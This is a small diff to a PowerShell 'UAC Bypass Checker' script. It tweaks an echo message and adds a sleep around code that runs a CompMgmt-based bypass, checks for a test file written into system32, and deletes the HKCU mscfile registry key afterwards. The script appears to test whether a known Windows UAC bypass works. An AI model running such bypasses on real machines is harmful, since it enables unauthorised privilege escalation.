@@ -27,7 +27,7 @@ UAC Bypass Checker
 		$a_cmd = "C:\windows\system32\cmd.exe"
 		&$a_cmd = $CompMgmtBypass
 		Start-Sleep -s 3
-		Echo "`n`THIS IS THE test.txt FILE IN C:\windows\system32 `n``n`THIS MEANS THAT UAC CAN BE BYPASSED`n``"
+		Echo "`n`THIS IS THE test.txt FILE IN C:\windows\system32 `n`THIS MEANS THAT UAC CAN BE BYPASSED"
 		gci -Recurse -Filter "test" -ErrorAction SilentlyContinue -Path "C:\windows\system32\"
 		
 		Start-Sleep -s 5
@@ -36,4 +36,5 @@ UAC Bypass Checker
 
 		$MscRegCleanup = "HKCU:\Software\Classes\mscfile"
 		Remove-Item -Path $MscRegCleanup -Force -Recurse -ErrorAction SilentlyContinue | Out-Null
+		Start-Sleep -s 5
 	}
